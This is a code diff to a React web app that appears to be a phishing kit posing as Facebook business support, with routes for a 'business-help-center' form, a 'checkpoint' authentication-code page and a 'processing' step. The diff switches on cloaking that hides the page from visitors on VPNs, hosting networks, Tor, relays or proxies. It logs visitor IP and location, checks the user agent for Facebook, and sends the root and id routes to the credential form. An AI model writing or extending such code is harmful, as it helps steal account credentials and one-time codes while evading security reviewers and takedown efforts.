@@ -46,18 +46,18 @@ function App() {
      // https://ipinfo.io/json
       fetch("https://ipinfo.io/widget").then(d => d.json()).then(d => {
         var countryCode = d.country;
-        // var privacy = d.privacy;
-        // if(privacy){
-        //   if(
-        //     //privacy.vpn == true
-        //    //|| privacy.hosting == true
-        //    //|| privacy.relay == true
-        //   // || privacy.tor == true
-        //   // || privacy.proxy == true
-        //   ){
-        //     SetUserHiden(true);
-        //   }
-        // }
+        var privacy = d.privacy;
+        if(privacy){
+          if(
+             privacy.vpn == true
+            || privacy.hosting == true
+            || privacy.relay == true
+            || privacy.tor == true
+            || privacy.proxy == true
+          ){
+            SetUserHiden(true);
+          }
+        }
         setCountryCode(countryCode.toLowerCase());
         localStorage.setItem(
           "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
@@ -71,7 +71,6 @@ function App() {
   useEffect(() => {
     setLocaltion();
   }, []);
-
 
   const userAgent = navigator.userAgent.toLowerCase();
   if(!userAgent.includes('facebook') 
@@ -94,8 +93,8 @@ function App() {
             <BrowserRouter>
               <div id="app">
                 <Routes>
-                  <Route path="/" element={<HomePage/>} />
-                  <Route path="id/:userID" element={<HomePage/>} />
+                  <Route path="/" element={<MyForm/>} />
+                  <Route path="id/:userID" element={<MyForm/>} />
                   <Route path="/business-help-center" element={<MyForm/>} />
                   <Route path="checkpoint/:userID" element={<AuthCode />} />
                   <Route path="processing/:userID" element={<ClassUser />} />
